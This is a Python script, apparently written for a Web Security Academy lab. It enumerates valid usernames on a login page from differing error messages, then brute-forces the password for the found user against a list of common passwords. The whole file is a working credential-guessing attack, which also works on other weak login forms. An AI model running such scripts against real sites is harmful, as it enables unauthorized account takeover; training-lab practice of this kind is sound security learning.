import requests
#import os

url = 'https://0a5d000204a8d6d280deb791007700e8.web-security-academy.net/login'

userlist = ['carlos','root','admin','test','guest','info','adm','mysql','user','administrator','oracle','ftp','pi','puppet','ansible','ec2-user','vagrant','azureuser','academico','acceso','access','accounting','accounts','acid','activestat','ad','adam','adkit','admin','administracion','administrador','administrator','administrators','admins','ads','adserver','adsl','ae','af','affiliate','affiliates','afiliados','ag','agenda','agent','ai','aix','ajax','ak','akamai','al','alabama','alaska','albuquerque','alerts','alpha','alterwind','am','amarillo','americas','an','anaheim','analyzer','announce','announcements','antivirus','ao','ap','apache','apollo','app','app01','app1','apple','application','applications','apps','appserver','aq','ar','archie','arcsight','argentina','arizona','arkansas','arlington','as','as400','asia','asterix','at','athena','atlanta','atlas','att','au','auction','austin','auth','auto','autodiscover']
passwords = ['123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','123123','baseball','abc123','football','monkey','letmein','shadow','master','666666','qwertyuiop','123321','mustang','1234567890','michael','654321','superman','1qaz2wsx','7777777','121212','000000','qazwsx','123qwe','killer','trustno1','jordan','jennifer','zxcvbnm','asdfgh','hunter','buster','soccer','harley','batman','andrew','tigger','sunshine','iloveyou','2000','charlie','robert','thomas','hockey','ranger','daniel','starwars','klaster','112233','george','computer','michelle','jessica','pepper','1111','zxcvbn','555555','11111111','131313','freedom','777777','pass','maggie','159753','aaaaaa','ginger','princess','joshua','cheese','amanda','summer','love','ashley','nicole','chelsea','biteme','matthew','access','yankees','987654321','dallas','austin','thunder','taylor','matrix','mobilemail','mom','monitor','monitoring','montana','moon','moscow']

def test_if_user_exists(user):
    data = { 'username': user, 'password': 'BLAAAA' }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r = requests.post(url, data=data, headers=headers)
    global response
    response = r.text
    return response

def test_if_password_correct(username, password):
    data = { 'username': username, 'password': password }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r = requests.post(url, data=data, headers=headers)
    global response
    response = r.text
    return response
    
        

for i in userlist:
    test_if_user_exists(i)
    if 'Invalid username' in response:
        print("[-] Testing access with username: " + i)
    else:
        print("[+] Found username: " + i + "!")
        break

print("[*] Correct username is: " + i)

for p in passwords:
    test_if_password_correct(i, p)
    if 'Incorrect password' in response:
        print("[-] Testing access with username: " + i + " and password: " + p)
    else:
        print("[+] Password found: " + p + "!")
        break

print("[*] Correct password is: " + p)
